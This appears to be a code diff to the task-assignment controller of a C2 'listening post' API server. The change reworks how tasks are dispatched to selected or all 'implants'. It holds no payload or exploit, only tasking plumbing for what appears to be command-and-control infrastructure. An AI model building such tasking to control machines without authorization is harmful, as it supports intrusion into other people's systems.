@@ -120,34 +120,39 @@ namespace ListeningPostApiServer.Controllers
         /// <summary>
         ///     Assigns a new to ask to specific agents, or all agents if an id is not specified
         /// </summary>
-        /// <param name="selectedIds">An array of identifiers.</param>
-        /// <param name="taskBase">   A task object.</param>
+        /// <param name="taskRequest">A task Request.</param>
         /// <returns>Task&lt;IActionResult&gt;.</returns>
         /// <remarks>
         ///     This controller is a bit unstable due to the specifications of this project
         ///     (behavior/responses are inconsistent between agent, UI, and Postman for example.).
         /// </remarks>
-        [HttpPost("{selectedIds?}")]
-        public async Task<IActionResult> Post([FromRoute] int[] selectedIds, [FromBody] TaskBase taskBase)
+        [HttpPost]
+        public async Task<IActionResult> Post([FromBody] TaskRequest taskRequest)
         {
             IList<TaskBase> newTasks = new List<TaskBase>();
 
-            if (selectedIds.Length == 0)
+            if (taskRequest.Task != null)
             {
+                if (taskRequest.Ids != null && taskRequest.Ids.Count() > 0)
+                {
+                    foreach (var id in taskRequest.Ids)
+                    {
+                        var implant = await _implantRepository.GetAsync(id);
+
+                        if (implant != null)
+                            newTasks.Add(await AssignTaskAsync(implant, taskRequest.Task));
+                    }
+
+                    return Ok(newTasks.AsEnumerable());
+                }
+
                 foreach (var implant in await _implantRepository.GetAsync())
-                    newTasks.Add(await AssignTaskAsync(implant, taskBase));
+                    newTasks.Add(await AssignTaskAsync(implant, taskRequest.Task));
+
                 return Ok(newTasks.AsEnumerable());
             }
 
-            foreach (var id in selectedIds)
-            {
-                var implant = await _implantRepository.GetAsync(id);
-
-                if (implant != null)
-                    newTasks.Add(await AssignTaskAsync(implant, taskBase));
-            }
-
-            return Ok(newTasks.AsEnumerable());
+            return BadRequest(new {message = "you need at least a task definition"});
         }
 
         /// <summary>
